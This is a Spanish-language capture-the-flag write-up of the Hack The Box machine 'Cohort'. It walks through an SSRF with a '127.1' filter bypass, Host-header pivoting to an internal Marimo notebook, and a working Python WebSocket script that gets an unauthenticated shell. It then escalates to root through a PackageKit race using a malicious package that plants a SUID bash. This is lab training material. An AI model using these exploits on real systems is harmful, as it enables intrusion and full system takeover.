---
title: "HTB Cohort - Write-Up"
date: 2026-10-30
categories: [Hack The Box]
tags: [ssrf, ip-filter-bypass, marimo-rce, host-header-pivot, packagekit-toctou, linux-privesc]
---

## Introducción

Cohort es una máquina Linux (Ubuntu 24.04) de dificultad fácil en Hack The Box centrada en la explotación de un SSRF en una función de validación de datos, el bypass de un filtro de IPs internas, el pivote a través de un reverse proxy por cabecera Host, un RCE no autenticado en un servicio interno (Marimo) y una condición de carrera (TOCTOU) en PackageKit para escalar a root.

| Concepto | Valor |
| --- | --- |
| Plataforma | Hack The Box |
| SO | Linux (Ubuntu 24.04) |
| IP víctima | 10.129.138.218 |
| Puertos abiertos | 22 (SSH), 80 (HTTP), 443 (HTTPS) |
| Técnicas | SSRF · bypass de filtro de IPs · descubrimiento de servicio interno · CVE-2026-39987 (auth bypass en Marimo) · pivote vía Host header · CVE-2026-41651 (TOCTOU en PackageKit) |

**Ruta general:** Enumeración de usuarios en la web (Mara Quinteros, Devin Oyelaran) → SSRF en el formulario "Source URL" de la app Cohort Analytics → bypass del filtro de IPs privadas usando la notación abreviada `127.1` → lectura del endpoint interno `/status` de Nginx, que revela un vhost interno de un notebook Marimo (`nb-<hash>.cohort.htb` → `127.0.0.1:8888`) → explotación de CVE-2026-39987 (bypass de autenticación en el WebSocket `/terminal/ws` de Marimo) alcanzado a través del reverse proxy público, que enruta por cabecera Host → shell como usuario `marimo` → escalada a root mediante CVE-2026-41651, una condición de carrera TOCTOU en las transacciones D-Bus de PackageKit.

## Fase 1 — Reconocimiento

```bash
nmap -sVC -p- --min-rate 5000 -T4 -vvv -oG deep_scan.txt 10.129.138.218
```

| Puerto | Servicio |
| --- | --- |
| 22 | SSH |
| 80 | HTTP |
| 443 | HTTPS |

El puerto 80 aloja la aplicación web **Cohort Analytics**; el puerto 443 sirve la misma aplicación bajo TLS.

## Fase 2 — Enumeración web

En la web se identifican dos usuarios potenciales: **Mara Quinteros** y **Devin Oyelaran** (candidatos para una futura enumeración de SSH o reutilización de credenciales).

La funcionalidad más relevante de la aplicación es un formulario de **"Source URL"**, pensado para validar una fuente de datos antes de una reconciliación. El formulario permite:

- Introducir una URL arbitraria que el servidor solicita él mismo.
- Elegir el **formato esperado** de la respuesta (CSV / JSON / NDJSON / Parquet), con el texto de ayuda: *"Used to sanity-check the response before reconciliation."*

> **Punto clave:** una funcionalidad que pide una URL controlada por el usuario y después valida/parsea su contenido según un formato elegido es candidata directa a **SSRF**, y el parser del formato específico puede añadir una segunda superficie de ataque (deserialización, XXE, etc.).

## Fase 3 — SSRF: confirmación y bypass del filtro de IPs

Se confirma el SSRF poniendo en el campo "Source URL" la IP propia en escucha:

```bash
nc -lvnp 8000
```

```
Source URL: http://<IP_ATACANTE>:8000
```

La conexión entrante confirma la petición saliente del servidor y filtra el User-Agent utilizado:

```
User-Agent: CohortInsights/1.0 (+source-validator)
```

La aplicación filtra rangos privados/loopback obvios (`127.0.0.1`, `localhost`, etc.), pero no normaliza la notación abreviada de direcciones IP. Solicitar `http://127.1` es interpretado por el sistema como `127.0.0.1`, saltándose el filtro:

```
Source URL: http://127.1/status
```

> **Punto clave:** el filtro de SSRF bloquea la cadena `127.0.0.1` de forma literal, pero no cubre representaciones equivalentes como `127.1`, que los resolutores de IP también aceptan como loopback. Solo los esquemas `http://` y `https://` están permitidos (`file://` y `gopher://` están bloqueados), lo que limita el SSRF a peticiones HTTP puras.

La respuesta del endpoint interno `/status` (servido por Nginx) filtra el mapa completo de upstreams internos:

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {"name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort"},
    {"name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000"},
    {"name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "internal analyst workspace, not for external use"}
  ]
}
```

El upstream `notebooks` revela un **vhost interno** (`nb-1be3782a8afd3ad5.cohort.htb`) que apunta a un servicio en el puerto **8888**, marcado explícitamente como "espacio de trabajo interno, no para uso externo".

## Fase 4 — Identificación del servicio interno Marimo

El puerto 8888 (solo accesible por loopback) corresponde a una instancia de **Marimo**, un notebook reactivo de Python, en su versión **0.20.4**. Esta versión es vulnerable a **CVE-2026-39987**: un bypass de autenticación en el endpoint WebSocket `/terminal/ws`, que omite la llamada a `validate_auth()` presente en el resto de endpoints, exponiendo una shell PTY sin necesidad de ningún token.

Entorno de reproducción usado para validar la vulnerabilidad de forma aislada:

```dockerfile
FROM python:3.12-slim
RUN pip install --no-cache-dir marimo==0.20.4
RUN mkdir -p /app/notebooks
RUN echo 'import marimo as mo; app = mo.App()' > /app/notebooks/test.py
WORKDIR /app/notebooks
EXPOSE 2718
CMD ["marimo", "edit", "--host", "0.0.0.0", "--port", "2718", "."]
```

```bash
$ python3 exp.py http://127.0.0.1:2718 exec "id && whoami && hostname"
[+] No auth needed! Terminal WebSocket connected
[+] Output:
uid=0(root) gid=0(root) groups=0(root)
root
ddfc452129c3
```

> **Nota:** con auth habilitada (el servidor genera un `access_token` aleatorio), el exploit la salta por completo, confirmando que el fallo está en el propio endpoint del WebSocket y no en la ausencia de un token configurado.

## Fase 5 — Explotación: RCE en Marimo vía pivote del reverse proxy

El servicio de Marimo en el puerto 8888 solo escucha en loopback, por lo que no es alcanzable directamente desde fuera. Sin embargo, el reverse proxy público (puerto 443) enruta las peticiones según la cabecera **Host**, incluyendo el *upgrade* a WebSocket. Esto permite alcanzar el vhost interno (`nb-1be3782a8afd3ad5.cohort.htb`) desde fuera, sin depender de la limitación GET-only del SSRF inicial.

Script en Python para conectar al WebSocket del terminal de Marimo forzando la cabecera Host al vhost interno:

```python
import ssl
import threading
import websocket

TARGET_IP = "10.129.138.218"
VHOST = "nb-1be3782a8afd3ad5.cohort.htb"

ws_url = f"wss://{TARGET_IP}/terminal/ws"

def recv_loop(ws):
    while True:
        try:
            data = ws.recv()
            if data:
                print(data, end="", flush=True)
        except Exception:
            print("\n[!] Conexión cerrada.")
            break

def main():
    ws = websocket.create_connection(
        ws_url,
        host=VHOST,                 # Cabecera Host para el enrutamiento de Nginx
        origin=f"https://{VHOST}",
        sslopt={"cert_reqs": ssl.CERT_NONE},  # certificado autofirmado del vhost
        timeout=10
    )
    print(f"[+] Conectado a {ws_url} (Host: {VHOST})")

    threading.Thread(target=recv_loop, args=(ws,), daemon=True).start()

    try:
        while True:
            cmd = input()
            if cmd.lower() == "exit":
                break
            ws.send(cmd + "\r")
    except KeyboardInterrupt:
        pass
    finally:
        ws.close()

if __name__ == "__main__":
    main()
```

> **Por qué funciona:** el reverse proxy público confía en la cabecera Host para decidir a qué backend interno reenviar la conexión, incluido el handshake WebSocket. Forzando `Host: nb-1be3782a8afd3ad5.cohort.htb` desde el exterior, el proxy actúa de puente hacia Marimo sin que el puerto 8888 esté expuesto directamente, y como `/terminal/ws` no valida autenticación (CVE-2026-39987), se obtiene una shell PTY interactiva.

Tras la conexión se obtiene shell como el usuario **marimo**:

```bash
id
# uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

### Flag de usuario

```bash
cat /home/marimo/user.txt
```

## Fase 6 — Escalada de privilegios (TOCTOU en PackageKit)

Se descarta la vía de capabilities tras revisar el sistema:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
```

Ninguna de estas capabilities corresponde a software explotable de forma directa en este contexto; son configuraciones estándar del sistema base.

Se comprueba la versión de **PackageKit** instalada:

```bash
dpkg -l | grep -i packagekit
```

```
ii  packagekit                    1.2.8-2ubuntu1.2   ...
```

La versión `1.2.8-2ubuntu1.2` está por debajo de la parcheada en Ubuntu 24.04 (`1.2.8-2ubuntu1.5`), y cae dentro del rango vulnerable a **CVE-2026-41651** (1.0.2 – 1.3.4): una condición de carrera **TOCTOU** (Time-of-Check to Time-of-Use) en el manejo de transacciones D-Bus de PackageKit.

Se verifican las dependencias necesarias para construir el exploit en la propia máquina víctima:

```bash
python3 -c "import gi" && which dpkg-deb
```

> **Por qué funciona:** PackageKit permite encadenar dos llamadas `InstallFiles` sobre la misma transacción D-Bus. La primera, con el flag `SIMULATE`, no requiere autenticación de Polkit porque es solo una simulación. Si se envía una segunda llamada `InstallFiles` —esta vez con el paquete malicioso real y sin `SIMULATE`— antes de que el demonio procese la primera, PackageKit sobrescribe los flags de la transacción original sin volver a pedir autenticación. El resultado es que el demonio instala el paquete como root, ejecutando su script `postinst` con privilegios de root.

Para forzar que ambas llamadas D-Bus se procesen en el mismo lote es necesario encadenar una llamada asíncrona `call()` seguida de `flush_sync()`, de forma que el backend las lea juntas. El paquete malicioso se construye en tiempo de ejecución con `dpkg-deb` (sin necesidad de compilador externo), incluyendo un script `postinst` que copia `bash` con el bit SUID activado:

```bash
cp /bin/bash /tmp/.suid_bash && chmod u+s /tmp/.suid_bash
```

Tras ejecutar el PoC (basado en el exploit público para CVE-2026-41651) y ganar la carrera, se obtiene un binario SUID de `bash`:

```bash
/tmp/.suid_bash -p
id
# uid=0(root) ...
```

### Flag de root

```bash
cat /root/root.txt
```
